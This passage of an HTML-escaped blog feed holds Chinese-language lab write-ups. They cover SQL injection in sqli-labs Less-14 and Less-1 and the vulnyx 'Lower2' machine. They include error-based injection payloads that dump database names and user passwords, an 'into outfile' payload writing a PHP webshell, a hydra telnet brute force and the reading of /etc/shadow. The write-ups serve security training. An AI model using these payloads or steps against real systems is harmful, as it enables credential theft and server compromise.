&lt;h1 id="less-14">Less-14&lt;/h1>
&lt;p>这关回显sql语法错误，并且闭合是&amp;quot;&lt;br>
测试&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">uname=admin&amp;#34;&amp;amp;passwd=pass&amp;amp;submit=Submit
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250324142325.png" alt="Pasted image 20250324142325">&lt;br>
和上一关一样，这关如果sql查询有值也不显示，所以还是用报错注入，图就不截了，和上一关差不多，跨库爆数据的所有payload如下：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#获取服务器上所有数据库的名称
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="nx">uname&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">ele&lt;/span>&lt;span class="s2">&amp;#34; and updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),1,31),0x7e),1)#&amp;amp;passwd=pass&amp;amp;submit=Submit
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">uname=ele&amp;#34;&lt;/span> &lt;span class="k">and&lt;/span> &lt;span class="nx">updatexml&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">concat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x7e&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">substr&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">select&lt;/span> &lt;span class="nx">group_concat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">schema_name&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">from&lt;/span> &lt;span class="nx">information_schema&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nx">schemata&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="mi">32&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">31&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="mh">0x7e&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="c1">#&amp;amp;passwd=pass&amp;amp;submit=Submit
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="nx">uname&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">ele&lt;/span>&lt;span class="s2">&amp;#34; and updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),63,31),0x7e),1)#&amp;amp;passwd=pass&amp;amp;submit=Submit
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">#获取pikachu数据库的所有表名称
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">uname=ele&amp;#34;&lt;/span> &lt;span class="k">and&lt;/span> &lt;span class="nx">updatexml&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">concat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x7e&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">substr&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">select&lt;/span> &lt;span class="nx">group_concat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">table_name&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">from&lt;/span> &lt;span class="nx">information_schema&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nx">tables&lt;/span> &lt;span class="nx">where&lt;/span> &lt;span class="nx">table_schema&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;pikachu&amp;#39;&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">31&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="mh">0x7e&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="c1">#&amp;amp;passwd=pass&amp;amp;submit=Submit
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="nx">uname&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">ele&lt;/span>&lt;span class="s2">&amp;#34; and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=&amp;#39;pikachu&amp;#39;),32,31),0x7e),1)#&amp;amp;passwd=pass&amp;amp;submit=Submit
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">#获取pikachu数据库users表的所有列名称
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">uname=ele&amp;#34;&lt;/span> &lt;span class="k">and&lt;/span> &lt;span class="nx">updatexml&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">concat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x7e&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">substr&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">select&lt;/span> &lt;span class="nx">group_concat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">column_name&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">from&lt;/span> &lt;span class="nx">information_schema&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nx">columns&lt;/span> &lt;span class="nx">where&lt;/span> &lt;span class="nx">table_schema&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;pikachu&amp;#39;&lt;/span> &lt;span class="k">and&lt;/span> &lt;span class="nx">table_name&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;users&amp;#39;&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">31&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="mh">0x7e&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="c1">#&amp;amp;passwd=pass&amp;amp;submit=Submit
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#获取pikachu数据库users表的username和password列的所有值
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="nx">uname&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">ele&lt;/span>&lt;span class="s2">&amp;#34; and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&amp;#39;^&amp;#39;,password)) from pikachu.users),1,31),0x7e),1)#&amp;amp;passwd=pass&amp;amp;submit=Submit
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">uname=ele&amp;#34;&lt;/span> &lt;span class="k">and&lt;/span> &lt;span class="nx">updatexml&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">concat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x7e&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">substr&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">select&lt;/span> &lt;span class="nx">group_concat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">concat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">username&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;^&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">password&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="nx">from&lt;/span> &lt;span class="nx">pikachu&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nx">users&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="mi">32&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">31&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="mh">0x7e&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="c1">#&amp;amp;passwd=pass&amp;amp;submit=Submit
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="nx">uname&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">ele&lt;/span>&lt;span class="s2">&amp;#34; and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&amp;#39;^&amp;#39;,password)) from pikachu.users),63,31),0x7e),1)#&amp;amp;passwd=pass&amp;amp;submit=Submit
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">uname=ele&amp;#34;&lt;/span> &lt;span class="k">and&lt;/span> &lt;span class="nx">updatexml&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">concat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x7e&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">substr&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">select&lt;/span> &lt;span class="nx">group_concat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">concat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">username&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;^&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">password&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="nx">from&lt;/span> &lt;span class="nx">pikachu&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nx">users&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="mi">94&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">31&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="mh">0x7e&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="c1">#&amp;amp;passwd=pass&amp;amp;submit=Submit
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>写webshell的payload：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">uname&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">ele&lt;/span>&lt;span class="s2">&amp;#34; or 1=1 limit 0,1 into outfile &amp;#39;C:/less14.php&amp;#39; lines terminated by 0x3C3F7068702061737365727428245F504F53545B6C65737331345D293B3F3E#&amp;amp;passwd=pass&amp;amp;submit=Submit
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>本关代码与上一关的区别也仅在于闭合不同了。&lt;/p></description></item><item><title>【靶场】vulnyx靶场-Lower2</title><link>http://localhost:1313/p/%E9%9D%B6%E5%9C%BAvulnyx%E9%9D%B6%E5%9C%BA-lower2/</link><pubDate>Sat, 30 Aug 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/%E9%9D%B6%E5%9C%BAvulnyx%E9%9D%B6%E5%9C%BA-lower2/</guid><description>&lt;img src="http://localhost:1313/images/23.webp" alt="Featured image of post 【靶场】vulnyx靶场-Lower2" />&lt;h1 id="简介">简介&lt;/h1>
&lt;p>vulnyx是一个提供各种漏洞环境的靶场平台，大部分环境是做好的虚拟机镜像文件，镜像预先设计了多种漏洞，需要使用VMware或者VirtualBox运行。每个镜像会有破解的目标，挑战的目标是获取操作系统的root权限和查看flag。&lt;/p>
&lt;h1 id="部署方法">&lt;strong>部署方法&lt;/strong>&lt;/h1>
&lt;p>官网：https://vulnyx.com/&lt;br>
1.在官网搜索你想要的镜像,然后下载&lt;br>
2.下载好后解压得到&lt;code>.ova&lt;/code>的文件，右击选择VMware进行打开&lt;br>
3.在弹出的框中，选择存放的位置，然后点击导入&lt;br>
4.最后等待导入完成，然后启动该虚拟机就可以了&lt;br>
&lt;strong>部署成功&lt;/strong>&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250307124829.png" alt="Pasted image 20250307124829">&lt;/p>
&lt;h1 id="步骤">步骤&lt;/h1>
&lt;h2 id="信息收集">信息收集&lt;/h2>
&lt;p>这里我就不收集了，IP地址获取到了，如果在实战情况下还是需要确认一下的，直接fscan扫一边看一下：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">./fscan.exe 192.168.198.137 -nobr -np
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nmap 192.168.30.45 -A -O -p 1-65535
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250307125229.png" alt="Pasted image 20250307125229">&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250307125239.png" alt="Pasted image 20250307125239">&lt;br>
这边使用fscan和nmap都扫描了一边发现开放了三个端口：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">22/tcp open ssh
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">23/tcp open telnet
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">80/tcp open http
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>这里进行尝试连接一下ssh，发现给出了一个账户：&lt;strong>b.taylor&lt;/strong>&lt;br>
22端口是不能爆破的。登录了一下发现是拒绝的。那就只能爆破23端口了。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250307125456.png" alt="Pasted image 20250307125456">&lt;br>
使用hydra进行爆破&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">字典下载地址：https://github.com/dw0rsec/rockyou.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">hydra -l b.taylor -P /root/Desktop/Tools/rockyou.txt telnet://192.168.198.137 -V -I
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250307130820.png" alt="Pasted image 20250307130820">&lt;br>
账号密码：b.taylor/rockyou&lt;br>
使用telnet进行登录即可：&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250307131333.png" alt="Pasted image 20250307131333">&lt;/p>
&lt;h2 id="user">user&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">ZWRjOWY1YzU1YWY4NzUwNTAzM2EyMGRkNDE5MzEzNjQK
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250307131600.png" alt="Pasted image 20250307131600">&lt;/p>
&lt;h2 id="shadow提权">shadow提权&lt;/h2>
&lt;p>发现这个用户附加了shadow组&lt;br>
可以查看一下权限&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">id
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cat /etc/shadow
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250307131746.png" alt="Pasted image 20250307131746">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">b.taylor:$y$j9T$du9sW7McN8WfjLKPRheP7/$pyE/4IrgDjurpaNzpdyxj8PYcOYyDksyYPG2rxEBxm4:20135:0:99999:7:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">root:$y$j9T$du9sW7McN8WfjLKPRheP7/$pyE/4IrgDjurpaNzpdyxj8PYcOYyDksyYPG2rxEBxm4:20134:0:99999:7:::
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>然后直接修改密码即可。&lt;/p></description></item><item><title>【靶场】sql-labs-Less1-5</title><link>http://localhost:1313/p/%E9%9D%B6%E5%9C%BAsql-labs-less1-5/</link><pubDate>Fri, 29 Aug 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/%E9%9D%B6%E5%9C%BAsql-labs-less1-5/</guid><description>&lt;img src="http://localhost:1313/images/19.webp" alt="Featured image of post 【靶场】sql-labs-Less1-5" />&lt;h1 id="less-1">Less-1&lt;/h1>
&lt;p>&lt;strong>验证注入点：单引号报错，两个单引号闭合利用闭合方式：&lt;code>' &amp;lt;payload&amp;gt; --+&lt;/code>&lt;/strong>&lt;br>
1.进入第一题，显示&lt;code>Please input the ID as parameter with numeric value&lt;/code>，告诉了我们参数为&lt;code>id&lt;/code>&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313160458.png" alt="Pasted image 20250313160458">&lt;br>
2.构造&lt;code>?id=1&lt;/code>,页面显示正常&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">http&lt;/span>&lt;span class="o">://&lt;/span>&lt;span class="nx">localhost&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sqli&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">labs&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">Less&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="o">/?&lt;/span>&lt;span class="nx">id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313160541.png" alt="Pasted image 20250313160541">&lt;br>
3.接下来加个单引号，显示语句出错，根据报错信息可以得知参数id的值被单引号包裹&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">http&lt;/span>&lt;span class="o">://&lt;/span>&lt;span class="nx">localhost&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sqli&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">labs&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">Less&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="o">/?&lt;/span>&lt;span class="nx">id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313160614.png" alt="Pasted image 20250313160614">&lt;br>
4.构造&lt;code>?id=1' and '1'='1&lt;/code>页面重新显示正常，由此判断出这题是&lt;strong>单引号字符型注入&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">http&lt;/span>&lt;span class="o">://&lt;/span>&lt;span class="nx">localhost&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sqli&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">labs&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">Less&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="o">/?&lt;/span>&lt;span class="nx">id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="s1">&amp;#39; and &amp;#39;&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="s1">&amp;#39;=&amp;#39;&lt;/span>&lt;span class="mi">1&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313160735.png" alt="Pasted image 20250313160735">&lt;br>
5.构造&lt;code>?id=1' order by 1 --+&lt;/code>通过order by子句来判断该数据表的字段数，页面显示正常。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">http&lt;/span>&lt;span class="o">://&lt;/span>&lt;span class="nx">localhost&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sqli&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">labs&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">Less&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="o">/?&lt;/span>&lt;span class="nx">id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="err">&amp;#39;&lt;/span> &lt;span class="nx">order&lt;/span> &lt;span class="nx">by&lt;/span> &lt;span class="mi">1&lt;/span> &lt;span class="o">--+&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313160914.png" alt="Pasted image 20250313160914">&lt;br>
构造&lt;code>?id=1' order by 4 --+&lt;/code>页面显示错误信息，由此可知该表&lt;strong>字段数为3&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">http&lt;/span>&lt;span class="o">://&lt;/span>&lt;span class="nx">localhost&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sqli&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">labs&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">Less&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="o">/?&lt;/span>&lt;span class="nx">id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="err">&amp;#39;&lt;/span> &lt;span class="nx">order&lt;/span> &lt;span class="nx">by&lt;/span> &lt;span class="mi">4&lt;/span> &lt;span class="o">--+&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313161001.png" alt="Pasted image 20250313161001">&lt;br>
6.构造&lt;code>?id=-1' union select 1,2,3 --+&lt;/code>判断出&lt;strong>回显点为该表的第二、三字段&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
